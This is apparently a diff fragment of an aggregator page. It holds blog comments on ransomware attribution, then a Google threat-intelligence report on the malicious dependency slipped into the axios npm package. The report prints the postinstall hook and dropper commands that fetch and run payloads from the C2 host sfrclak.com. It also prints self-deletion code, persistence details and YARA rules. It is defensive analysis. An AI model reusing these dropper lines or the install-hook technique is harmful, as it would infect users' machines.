-Might as well be living on the sun.
-He’s got an umbrella and time to kill. It’s a dry heat.
-I believe his identity is BIG BALLS! You know the guy that got beat up by a girl in DC and even of more surprise he was on a date with a GIRL.
-Seems like something the snowflake orange one would be involved with.
-There was some chatter on Telegram about ShinyHunters running The Gentlemen ransomware group, but oh well…
-Not the same people, of course. Sort of like suggesting Horohorin is, I dunno, the dude that runs the Krebs carding dump site.
-No Doubt!
-TIL that WayBackMachine archived Google Plus (RIP) posts..
-It’s cute that even Russian ransomware gangs think stuff like… GDPR violations? matter at all in the real world.
-From reading the Checkpoint article, it definitely seems like we’re finally getting into the era of “AI-powered ransomware”. Not completely “agentic” a la “claude, ransom this company, make no mistakes”, but like… AI-written panels, AI-written ransom notes, and seeing as how quick and badly they got pwned, I’d imagine some local Chinese AI was like “You’re absolutely right, exposing port 445 on your Synology NAS to the clearnet is the most secure way to securely access your files anywhere!” and now we’re here.
-This pretty much nulls most textual forensics, too, yeah.
-When I lived in Transnistria briefly, many many years ago, there were no ATMs at all. It was a surprisingly genteel place to stay for a week or two to get away from crazies, LGBTQ- obsessed Pussy Riot fans, and tourists, until they made that mean something else entirely. CLEARLY, there was access to legitimate ATMs an easy, cheap train-ride away, until the sheeeyit hit the Kendrick a few months (and many many years) later.
-welp! time for my teeth to marry the extension cord again!
-Arguably, they should not, merely by the existence of a name, known it was the same person, no less a ‘criminal’, right?
-soon the next prod release of Kill Your Celf will push!
-Quickly, quickly ai chatbot!
-The NSA.
-WHAT DID I WIN
-The same guys who run every ransomware group
-The same guys who run Krebs.
-Did you use a real russian time?Brian , or is it a synthetic russian?
-Cant arrest data. Even from the Moscow field office of the FBI
-The same guys who run every ransomware group
-The same guys who run Krebs.
-Did you use a real russian this time?Brian , or is it a synthetic russian?
-Cant arrest data. Even from the Moscow field office of the FBI
-If Yan can’t think then NOBODY IS ALLOWED TO. Off to the reeducation camps like a good lad.
-Martin,
-Go squat in a thorny tree.
-What is Martin’s metier, anyway?
-Krebs isn’t run by any one group of anything any more than you are.
-Lots of AI slop puppeting every meatpuppet now (no offense, Brian).
-Great breakdown on threat actor attribution. Security research like this is essential for organizations evaluating third-party risk. I run a site covering crypto and financial analysis and send your investigative work to clients regularly as a reference.
-Very interesting article, I always say there’s only one internet and there’s residue from everyone on it. And now with AI able to aggregate so much it truly shows that the internet is us and we are the internet. We’ve been building our digital persona for years, our essence is in the very fabric.</div>
+            <h2 class="article-title">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package/" target="_blank">Original Link</a></p>
+            <div class="content-text">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack
+Google Threat Intelligence Group
+Mandiant
+Google Threat Intelligence
+Visibility and context on the threats that matter most.
+[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
+Written by: Austin Larsen, Dima Lenz, Adrian Hernandez, Tyler McLellan, Christopher Gardner, Ashley Zaya, Michael Rudden, Mon Liclican, Muhammad Umair
+Introduction
+Google Threat Intelligence Group (GTIG) is tracking an active software supply chain attack targeting the popular Node Package Manager (NPM) package "[axios](https://www.npmjs.com/package/axios)." Between March 31, 2026, 00:21 and 03:20 UTC, an attacker introduced a malicious dependency named "plain-crypto-js
+" into axios NPM releases versions 1.14.1 and 0.30.4. Axios is the most popular JavaScript library used to simplify HTTP requests, and these packages typically have over 100 million and 83 million weekly downloads, respectively. This malicious dependency is an obfuscated dropper that deploys the WAVESHAPER.V2 backdoor across Windows, macOS, and Linux.
+GTIG attributes this activity to [UNC1069](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a financially motivated North Korea-nexus threat actor active since at least 2018, based on the use of WAVESHAPER.V2, an updated version of [WAVESHAPER](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering) previously used by this threat actor. Further, analysis of infrastructure artifacts used in this attack shows overlaps with infrastructure used by UNC1069 in past activities.
+This blog details the attack lifecycle, from the initial account compromise to the deployment of operating system (OS)-specific payloads, and provides actionable guidance for defenders to identify and mitigate this threat.
+Campaign Overview
+On March 31, 2026, GTIG observed the introduction of plain-crypto-js
+version 4.2.1 as a dependency in the legitimate axios
+package version 1.14.1. Analysis indicates the maintainer account associated with the axios
+package was compromised, with the associated email address changed to an attacker-controlled account (ifstap@proton.me
+).
+The threat actor used the postinstall
+hook within the "package.json"
+file of the malicious dependency to achieve silent execution. Upon installation of the compromised axios
+package, NPM automatically executes an obfuscated JavaScript dropper named "setup.js"
+in the background.
+"scripts": {
+"test": "echo \"Error: no test specified\" && exit 1",
+"postinstall": "node setup.js"
+}
+Malware Analysis
+The plain-crypto-js
+package serves as a payload delivery vehicle. The core component, SILKBELL, setup.js
+(SHA256: e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09
+), dynamically checks the target system's operating system upon execution to deliver platform-specific payloads.
+The script uses a custom XOR and Base64-based string obfuscation routine to conceal the command-and-control (C2 or C&C) URL and host OS execution commands. To evade static analysis, it dynamically loads fs
+, os
+, and execSync
+. After successfully dropping the secondary payload, setup.js
+attempts to delete itself and revert the modified package.json
+to hide forensic traces of the postinstall
+hook.
+Operating System-Specific Execution Paths
+Depending on the identified platform, the dropper executes the following routines.
+Windows
+The dropper actively hunts for the native powershell.exe
+binary. To evade detection, it copies the legitimate executable to %PROGRAMDATA%\wt.exe
+. It then downloads a PowerShell script via curl
+using the POST body packages.npm.org/product1
+and saves it to the user's AppData Temp directory (e.g., %TEMP%\6202033.ps1
+). The payload is executed using a copied Windows Terminal executable with hidden and execution policy bypass flags.
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "cmd.exe /c curl -s -X POST -d packages.npm.org/product1 http://sfrclak[.]com:8000/6202033 > %TEMP%\6202033.ps1
+& %PROGRAMDATA%\wt.exe -w hidden -ep bypass -file %TEMP%\6202033.ps1 http://sfrclak[.]com:8000/6202033 & del ""PS_PATH"" /f", 0, False
+macOS
+The malware uses bash
+and curl
+to download a native Mach-O binary payload to /Library/Caches/com.apple.act.mond
+using the POST body packages.npm.org/product0
+. It modifies permissions to make the file executable and launches it via zsh
+in the background.
+try
+do shell script "
+curl -o /Library/Caches/com.apple.act.mond
+-d packages.npm.org/product0
+-s http://sfrclak.com:8000/6202033
+&& chmod 770 /Library/Caches/com.apple.act.mond
+&& /bin/zsh -c "/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &"
+&> /dev/null"
+"
+end try
+do shell script "rm -rf tmp/6202033"
+Linux
+The script downloads a Python backdoor to /tmp/ld.py
+using the POST body packages.npm.org/product2
+.
+Cleanup
+Aside from removing downloaded scripts in two execution branches, the script attempts to remove itself and replace an injected package.json with an original one, which was stored as "package.md
+".
+const K = __filename;
+t.unlink(K, (x => {}))
+t.unlink('package.json', (x => {})), t.rename('package.md', 'package.json', ord)
+WAVESHAPER.V2 Backdoor Capabilities
+The platform-specific payloads ultimately deploy variants of a backdoor tracked by GTIG as WAVESHAPER.V2, a backdoor written in C++ that targets macOS to collect system information, enumerate directories, or execute additional payloads and that connects to the C2 provided via command-line arguments. Notably, GTIG identified additional variants of WAVESHAPER.V2 written in PowerShell and Python to target diverse environments. Regardless of the operating system, the malware beacons to the C2 endpoint over port 8000 at 60-second intervals. The beacon consists of Base64-encoded JSON data and uses a hard-coded User-Agent:
+mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)
+Following the initial beaconing to the adversary infrastructure, WAVESHAPER.V2 continuously polls, pausing for 60 seconds awaiting instructions. The server response determines the next action taken by the implant. The backdoor supports multiple commands outlined in the Table 1.
+On Windows, persistence is achieved by creating a hidden batch file (%PROGRAMDATA%\system.bat
+) and adding a new entry named MicrosoftUpdate
+to HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+to launch it at logon.
+WAVESHAPER.V2 acts as a fully functional RAT with the following capabilities:
+-
+Reconnaissance: Extracts system telemetry, including hostname, username, boot time, time zone, OS version, and detailed running process lists.
+-
+Command Execution: Supports multiple execution methods, including in-memory Portable Executable (PE) injection and arbitrary shell commands. The shell execution command expects a script and script parameters from C2; if no script is provided, the parameter is executed as a PowerShell command, but if a script is provided, it is either Base64-encoded or placed into a file depending on its size.
+-
+File System Enumeration: Returns detailed metadata for requested target directories by continuously recursing through the file system.
+Attribution
+GTIG attributes this activity to [UNC1069](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a financially motivated North Korea-nexus threat actor active since 2018. Analysis of the C2 infrastructure (sfrclak[.]com
+resolving to 142.11.206.73
+) revealed connections from a specific AstrillVPN node previously used by UNC1069. Additionally, adjacent infrastructure hosted on the same ASN has been historically linked to UNC1069 operations.
+Furthermore, WAVESHAPER.V2 is a direct evolution of [WAVESHAPER](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a macOS and Linux backdoor previously attributed to UNC1069. While the original WAVESHAPER uses a lightweight, raw binary C2 protocol and employs code packing, WAVESHAPER.V2 communicates using JSON, collects additional system information, and supports more backdoor commands. Despite these upgrades, both versions accept their C2 URL dynamically via command-line arguments, share identical C2 polling behaviors and an uncommon User-Agent string, and deploy secondary payloads to identical temporary directories (e.g., /Library/Caches/com.apple.act.mond
+).
+Outlook and Implications
+The impact of this attack by North Korea-nexus actors is broad and has ripple effects as other popular packages rely on axios as a dependency. Notably, UNC1069 isn’t the only threat actor that has launched successful open source supply chain attacks in recent weeks. UNC6780 (also known as TeamPCP) recently poisoned GitHub Actions and PyPI packages associated with projects like Trivy, Checkmarx, and LiteLLM to deploy the SANDCLOCK credential stealer and facilitate follow-on extortion operations.
+Hundreds of thousands of stolen secrets could potentially be circulating as a result of these recent attacks. This could enable further software supply chain attacks, software as a service (SaaS) environment compromises (leading to downstream customer compromises), ransomware and extortion events, and cryptocurrency theft over the near term.
+Supply chain compromise is a particularly dangerous tactic because it abuses the inherent trust that users and enterprise administrators place in hardware, software, and updates supplied by reputable vendors as well as the trust they may not realize they are placing in collaborative code-sharing communities. Defenders should pay close attention to these campaigns, and enterprises should initiate dedicated efforts to assess the existing impact, remediate compromised systems, and harden environments against future attacks.
+Remediation
+GTIG urges all developers and organizations using the axios package to take immediate corrective action. Priority should be given to auditing dependency trees for compromised versions, isolating affected hosts, and rotating any potentially exposed secrets or credentials. Following initial containment, organizations must implement long-term hardening through strict version pinning and enhanced supply-chain monitoring.
+-
+Version Control: Do not upgrade to axios version 1.14.1 or 0.30.4. Ensure corporate-managed NPM repositories are configured to serve only known-good versions (e.g., 1.14.0 or earlier; 0.30.3 or earlier).
+-
+Dependency Pinning: Pin axios to a known safe version in your
+package-lock.json
+to prevent accidental upgrades. -
+Malicious Package Audit: Inspect project lockfiles specifically for the 'plain-crypto-js' package (versions 4.2.0 or 4.2.1). Use tools like
+[Wiz](https://wiz.io)or[Open Source Insights](https://deps.dev/)for deeper dependency auditing. -
+Pipeline Security: Pause CI/CD deployments for any package relying on axios. Validate that builds are not pulling "latest" versions before redeploying with pinned, safe versions.
+-
+Incident Response: If
+plain-crypto-js
+is detected, assume the host environment is compromised. Revert the environment to a known-good state and rotate all credentials or secrets present on that machine. -
+Network Defense: Block all traffic to sfrclak[.]com and the command & control IP: 142.11.206.73. Monitor and alert on any endpoint communication attempts to this domain.
+-
+Cache Remediation: Clear local and shared npm, yarn, and pnpm caches on all workstations and build servers to prevent re-infection during subsequent installs.
+-
+Endpoint Protection: Deploy EDR to protect developer environments. Monitor for suspicious processes spawning from Node.js applications that match known Indicators of Compromise (IOCs).
+-
+Credential Management: Rotate all tokens and API keys used by applications confirmed to have run indicators of compromise (IOCs).
+- Developer Sandboxing & Secret Vaulting: Isolate development environments in containers or sandboxes to restrict host filesystem access, and migrate plaintext secrets to the OS keychain using
+[aws-vault](https://github.com/ByteNess/aws-vault?tab=readme-ov-file). This ensures compromised packages cannot programmatically scrape credentials or execute malicious scripts directly on the host machine.
+Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying the activity outlined in this blog post, we have included IOCs in a free [GTI Collection](https://www.virustotal.com/gui/collection/c5adea0fa8aac14e6aabd8d3d4a1d19e4cd0eb76e679f2e9d3fed2a3170c09bb/summary) for registered users.
+Network Indicators
+File Indicators
+YARA Rules
+These rules may be most useful on developer workstations, CI/build systems, and other suspected impacted hosts for retrospective hunting and validation.
+rule G_Backdoor_WAVESHAPER.V2_PS_1
+{
+meta:
+description = "Detects the WAVESHAPER.V2 PowerShell backdoor which communicates with C2 via base64 encoded JSON beacons and supports PE injection and script execution"
+author = "GTIG"
+md5 = "04e3073b3cd5c5bfcde6f575ecf6e8c1"
+date_created = "2026/03/31"
+date_modified = "2026/03/31"
+rev = 1
+platforms = "Windows"
+family = "WAVESHAPER.V2"
+strings:
+$ss1 = "packages.npm.org/product1" ascii wide nocase
+$ss2 = "Extension.SubRoutine" ascii wide nocase
+$ss3 = "rsp_peinject" ascii wide nocase
+$ss4 = "rsp_runscript" ascii wide nocase
+$ss5 = "rsp_rundir" ascii wide nocase
+$ss6 = "Init-Dir-Info" ascii wide nocase
+$ss7 = "Do-Action-Ijt" ascii wide nocase
+$ss8 = "Do-Action-Scpt" ascii wide nocase
+condition:
+uint16(0) != 0x5A4D and filesize < 100KB and 5 of ($ss*)
+}
+rule G_Hunting_Downloader_suspected_UNC1069_PS_1
+{
+meta:
+description = "Detects PowerShell dropper associated with suspected UNC1069 and Axios npm package supply chain attack. Associated to WAVESHAPER.V2"
+author = "GTIG"
+md5 = "089e2872016f75a5223b5e02c184dfec"
+date_created = "2026/03/31"
+date_modified = "2026/03/31"
+rev = 1
+platforms = "Windows"
+strings:
+$ss1 = "start /min powershell -w h" ascii wide nocase
+$ss2 = "[scriptblock]::Create([System.Text.Encoding]::UTF8.GetString" ascii wide nocase
+$ss3 = "Invoke-WebRequest -UseBasicParsing" ascii wide nocase
+$ss4 = "-Method POST -Body" ascii wide nocase
+$ss5 = "packages.npm.org/product1" ascii wide nocase
+condition:
+uint16(0) != 0x5A4D and filesize < 5KB and all of them
+}
+rule G_Hunting_Downloader_SILKBELL_1
+{
+meta:
+description = "Detects the obfuscated version of the JS NPM supply chain downloader using Base64 obfuscation and custom XOR. Associated with WAVESHAPER.V2"
+author = "GTIG"
+md5 = "7658962ae060a222c0058cd4e979bfa1"
+date_created = "2026/03/31"
+date_modified = "2026/03/31"
+rev = 1
+platforms = "Any"
+strings:
+$ss1 = "OrDeR_7077" ascii wide fullword
+$ss2 = "String.fromCharCode(S^a^333)" ascii wide
+$ss3 = "\"TE9DQUw^\".replaceAll(\"^\",\"=\")" ascii wide
+$ss4 = "\"UFM_\".replaceAll(\"_\",\"=\")" ascii wide
+$ss5 = "\"U0NSXw--\".replaceAll(\"-\",\"=\")" ascii wide
+$ss6 = "\"UFNfQg--\".replaceAll(\"-\",\"=\")" ascii wide
+$ss7 = "\"d2hlcmUgcG93ZXJzaGVsbA((\".replaceAll(\"(\",\"=\")" ascii wide
+condition:
+uint16(0) != 0x5A4D and filesize < 100KB and all of them
+}
+Google Security Operations (SecOps)
+Google Security Operations (SecOps) customers have access to the following broad category rules and more under the Mandiant Intel Emerging Threats rule pack.
+-
+Curl Writing Apple System File to Staging Directory
+-
+Node Spawning Nohup Osascript
+-
+Node Spawning Windows Script Host With Delete Command
+-
+Windows Script Host Spawning Shell With Curl
+-
+Windows Terminal In Suspicious Staging Directory
+Wiz
+Wiz customers should check their Wiz Threat Center for information on this advisory and whether or not they are impacted. For more information refer to Wiz’s blog post, [Axios NPM Distribution Compromised in Supply Chain Attack](https://www.wiz.io/blog/axios-npm-compromised-in-supply-chain-attack).</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
